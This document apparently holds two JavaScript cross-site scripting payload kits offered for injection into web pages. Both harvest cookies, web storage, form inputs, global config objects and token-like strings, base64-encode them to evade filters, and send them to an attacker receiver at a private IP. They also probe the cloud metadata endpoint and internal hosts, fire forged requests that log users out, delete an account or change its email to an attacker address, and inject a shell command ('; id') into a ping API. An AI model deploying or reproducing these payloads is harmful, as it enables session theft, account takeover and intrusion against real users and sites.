/**
 * XSS Exfiltration & Reconnaissance Suite
 * 
 * Features:
 * - Aggregated Reporting: Bundles synchronous data into a single request.
 * - Resilience: Uses sendBeacon > fetch > xhr for reliable transmission.
 * - Modular: Distinct phases for Recon, Scraper, and Active attacks.
 * - Execution Safety: Robust error handling to prevent script termination.
 */

(function () {
    'use strict';

    // --- Configuration ---
    const CONFIG = {
        receiver: "http://192.168.1.221:8080", // Target Receiver
        sessionId: crypto.randomUUID ? crypto.randomUUID() : Date.now().toString(36),
        aggressive: true, // Set to false to disable CSRF/modification attempts
        probeTimeout: 2000 // Timeout for network probes
    };

    // --- Utilities ---
    
    /**
     * Safely transmits data to the receiver.
     * Prioritizes sendBeacon for reliability on page unload.
     */
    const exfiltrate = (data, endpoint = "/") => {
        const payload = JSON.stringify({
            session: CONFIG.sessionId,
            timestamp: new Date().toISOString(),
            url: location.href,
            ...data
        });

        // Base64 encode the payload to bypass simple WAF JSON detection
        const encoded = btoa(unescape(encodeURIComponent(payload)));
        const targetUrl = `${CONFIG.receiver}${endpoint}`;

        if (navigator.sendBeacon) {
            // Send as Blob to ensure Content-Type is correct
            const blob = new Blob([`data=${encoded}`], { type: 'application/x-www-form-urlencoded' });
            navigator.sendBeacon(targetUrl, blob);
        } else {
            // Fallback for older browsers
            try {
                fetch(targetUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `data=${encoded}`,
                    keepalive: true
                }).catch(() => {});
            } catch (e) {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', targetUrl, true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send(`data=${encoded}`);
            }
        }
    };

    /**
     * Safe execution wrapper to prevent one module crashing the suite.
     */
    const tryExec = (fn, fallback = null) => {
        try { return fn(); } catch (e) { return fallback; }
    };

    // --- Module: Reconnaissance (Synchronous) ---
    // Collects environment data immediately.
    
    const gatherIntel = () => {
        return {
            cookies: document.cookie,
            origin: location.origin,
            referrer: document.referrer,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            localStorage: tryExec(() => JSON.stringify(localStorage), "{}"),
            sessionStorage: tryExec(() => JSON.stringify(sessionStorage), "{}"),
            // Extract potential sensitive tokens from global scope
            globalConfig: tryExec(() => {
                const results = {};
                for (const key of Object.keys(window)) {
                    if (/config|user|token|api|key/i.test(key) && typeof window[key] === 'object') {
                        results[key] = window[key];
                    }
                }
                return results;
            }, {})
        };
    };

    // --- Module: Scraper (DOM & Content) ---
    // Scrapes the visible page content.

    const scrapeContent = () => {
        return {
            title: document.title,
            // Grab the first 2KB of HTML structure
            domStart: document.documentElement.outerHTML.slice(0, 2048),
            // Extract all links
            links: Array.from(document.links).map(l => l.href).slice(0, 50),
            // Extract all scripts
            scripts: Array.from(document.scripts).map(s => s.src || 'inline').slice(0, 50),
            // Regex hunt for secrets in the body text
            potentialSecrets: tryExec(() => {
                const bodyText = document.body.innerText;
                const regex = /(api[_-]?key|token|secret|password|auth)[^\s"']{0,40}/gi;
                return (bodyText.match(regex) || []).slice(0, 10);
            }, []),
            // Input field values (if any)
            inputs: Array.from(document.querySelectorAll('input, textarea')).map(i => ({name: i.name, value: i.value})),
        };
    };

    // --- Module: Network Probes (Async) ---
    // Scans internal network and attempts SSRF.

    const probeNetwork = async () => {
        const targets = [
            "/api/internal/config",
            "/admin",
            "http://169.254.169.254/latest/meta-data/"
        ];

        targets.forEach(url => {
            fetch(url, { signal: AbortSignal.timeout(CONFIG.probeTimeout) })
                .then(r => r.text())
                .then(text => exfiltrate({ 
                    type: "probe_success", 
                    target: url, 
                    response: text.slice(0, 500) 
                }))
                .catch(e => { /* mute failures to reduce noise */ });
        });
    };

    // --- Module: Active Actions ---
    // CSRF and state modification. Only runs if aggressive mode is on.

    const performActions = () => {
        if (!CONFIG.aggressive) return;

        // Example: Force image beacon (GET CSRF)
        new Image().src = `${location.origin}/api/logout?csrf_bypass=1`;

        // Example: Hidden Iframe loader
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = `${location.origin}/admin/settings`;
        iframe.onload = () => {
            try {
                // Attempt to read iframe content (only works if same-origin)
                const content = iframe.contentDocument.body.innerText;
                exfiltrate({ type: "iframe_capture", content: content.slice(0, 500) });
            } catch (e) { /* blocked by SOP */ }
        };
        document.body.appendChild(iframe);
    };

    // --- Main Execution Orchestrator ---

    const main = () => {
        // 1. Send initial beacon (Intel + Scrape)
        const initialData = {
            type: "initial_beacon",
            ...gatherIntel(),
            ...scrapeContent()
        };
        exfiltrate(initialData);

        // 2. Setup Canvas Snapshot (Expensive operation)
        tryExec(() => {
            const canvas = document.querySelector('canvas');
            if (canvas) {
                exfiltrate({ 
                    type: "canvas_snapshot", 
                    data: canvas.toDataURL().slice(0, 5000) 
                });
            }
        });

        // 3. Start Async Network Probes
        probeNetwork();

        // 4. Run Active Attacks
        performActions();

        // 5. Setup Error Listener
        window.addEventListener('error', (e) => {
            exfiltrate({ type: "js_error", message: e.message, filename: e.filename });
        });
    };

    // Delay execution slightly to ensure DOM is ready
    if (document.readyState === 'complete') {
        main();
    } else {
        window.addEventListener('load', main);
    }

})();

//
//

// payloads__.js
//
// 🕵️ Modular XSS Payloads for Exfiltration & Recon
// Send data to your receiver for analysis and storage.
//
// Usage: Inject this script via <script src=...> or convert to a bookmarklet.
// Customize `TARGET` to your receiver IP or domain.

(function () {
  const TARGET = "http://192.168.1.221:8080"; // ← Your XSS receiver endpoint
  const ORIGIN = location.origin;

  function postData(encoded, path = "") {
    try {
      const xhr = new XMLHttpRequest();
      xhr.open("POST", `${TARGET}${path}`, true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send("data=" + encodeURIComponent(encoded));
    } catch (_) {}
  }

  function sendRaw(data, path = "") {
    postData(btoa(data), path);
  }

  // 1. DOM Preview
  sendRaw(document.documentElement.outerHTML.slice(0, 2048), "/dom");

  // 2. Cookie + Env Info
  sendRaw(document.cookie + " | " + navigator.userAgent, "/meta");

  // 3. CSRF via GET (image beacon)
  try {
    const img = new Image();
    img.src = `${ORIGIN}/account/delete?id=1234`;
  } catch (_) {}

  // 4. CSRF via POST (auto-submit form)
  try {
    const f = document.createElement("form");
    f.method = "POST";
    f.action = `${ORIGIN}/account/change-email`;
    const i = document.createElement("input");
    i.name = "email";
    i.value = "admin@attacker.test";
    f.appendChild(i);
    document.body.appendChild(f);
    f.submit();
  } catch (_) {}

  // 5. Command Injection Probe
  try {
    const payload = { host: "127.0.0.1; id" };
    const r = new XMLHttpRequest();
    r.open("POST", `${ORIGIN}/api/ping`, true);
    r.setRequestHeader("Content-Type", "application/json");
    r.onload = function () {
      sendRaw("cmd result: " + this.responseText, "/cmd");
    };
    r.onerror = function () {
      sendRaw("cmd request failed", "/cmd-error");
    };
    r.send(JSON.stringify(payload));
  } catch (_) {}

  // 6. SSRF to local config
  try {
    fetch(`${ORIGIN}/api/internal/config`)
      .then(r => r.text())
      .then(t => sendRaw("internal config: " + t.slice(0, 512), "/config"));
  } catch (_) {}

  // 7. Timing Profile
  try {
    const t1 = performance.now();
    fetch(`${ORIGIN}/healthz?debug=1`).then(() => {
      const delta = performance.now() - t1;
      sendRaw("delta=" + delta.toFixed(2), "/timing");
    });
  } catch (_) {}

  // 8. Iframe Force-load
  try {
    const i = document.createElement("iframe");
    i.style.display = "none";
    i.src = `${ORIGIN}/admin/refresh`;
    document.body.appendChild(i);
  } catch (_) {}

  // 9. SSRF Probe (common internal endpoints)
  const internalHosts = [
    "http://localhost:8000/status",
    "http://127.0.0.1:5000/debug",
    "http://169.254.169.254/latest/meta-data/hostname",
  ];
  internalHosts.forEach(url => {
    try {
      fetch(url)
        .then(r => r.text())
        .then(t => sendRaw("fetched " + url + ": " + t.slice(0, 128), "/ssrf"));
    } catch (_) {}
  });

  // 10. JS Error Beacon
  window.addEventListener("error", function (e) {
    sendRaw("client error: " + e.message, "/error");
  });

  // 11. DevOps POST Trigger
  try {
    fetch(`${ORIGIN}/api/refresh`, {
      method: "POST",
      headers: { "X-Trigger": "soft" },
    });
  } catch (_) {}

  // 12. Delayed DOM Snapshot
  setTimeout(() => {
    try {
      const section = document.querySelector("main")?.outerHTML || "";
      sendRaw("delayed view: " + section.slice(0, 1024), "/deferred");
    } catch (_) {}
  }, 3000);

  // 13. localStorage + sessionStorage
  try {
    const allStorage = Object.entries(localStorage).map(([k,v]) => `${k}=${v}`).join('; ') +
                       " | " +
                       Object.entries(sessionStorage).map(([k,v]) => `${k}=${v}`).join('; ');
    sendRaw("storage: " + allStorage, "/storage");
  } catch (_) {}

  // 14. Link Collector
  try {
    const links = [...document.links].map(l => l.href).join('\n');
    sendRaw("links: " + links.slice(0, 1024), "/links");
  } catch (_) {}

  // 15. Script Tag Inventory
  try {
    const scripts = [...document.scripts].map(s => s.src || '[inline]').join('\n');
    sendRaw("scripts: " + scripts.slice(0, 1024), "/scripts");
  } catch (_) {}

  // 16. Token Pattern Discovery
  try {
    const body = document.body.innerText;
    const matches = body.match(/(api[_-]?key|token|secret)[^\s"']{0,40}/gi);
    if (matches && matches.length) {
      sendRaw("potential secrets: " + matches.join(', '), "/secrets");
    }
  } catch (_) {}

  // 17. Canvas Snapshot
  try {
    const canvas = document.querySelector("canvas");
    if (canvas) {
      const data = canvas.toDataURL("image/png");
      sendRaw("canvas snapshot: " + data.slice(0, 256), "/canvas");
    }
  } catch (_) {}

  // 18. DNS Beacon (external)
  try {
    const a = document.createElement("a");
    a.href = "http://leak.YOURDOMAIN.test";
    document.body.appendChild(a);
  } catch (_) {}

  // 19. Inline JS Capture
  try {
    const src = document.querySelector("script:not([src])")?.textContent || "";
    sendRaw("inline script: " + src.slice(0, 512), "/inlinejs");
  } catch (_) {}

  // 20. CSP Header Detection
  try {
    fetch("/", { method: "HEAD" }).then(r => {
      const csp = r.headers.get("Content-Security-Policy");
      if (csp) sendRaw("CSP header: " + csp, "/csp");
    });
  } catch (_) {}

  // 21. Iframe SRCs
  try {
    const iframes = [...document.querySelectorAll("iframe")].map(i => i.src).join(', ');
    sendRaw("iframes: " + iframes, "/iframes");
  } catch (_) {}

  // 22. Meta Token Dump
  try {
    const metas = [...document.querySelectorAll("meta")].map(m => `${m.name || m.property || m.httpEquiv}=${m.content}`).join('; ');
    sendRaw("meta tokens: " + metas, "/meta-tokens");
  } catch (_) {}

  // 23. JavaScript Config Object Extraction
  try {
    for (let k in window) {
      if (/config|settings|options/i.test(k) && typeof window[k] === "object") {
        const payload = JSON.stringify(window[k]);
        if (payload.length > 20 && payload.length < 2048) {
          sendRaw("window." + k + ": " + payload.slice(0, 1024), "/config-obj");
          break;
        }
      }
    }
  } catch (_) {}

})();
//
//

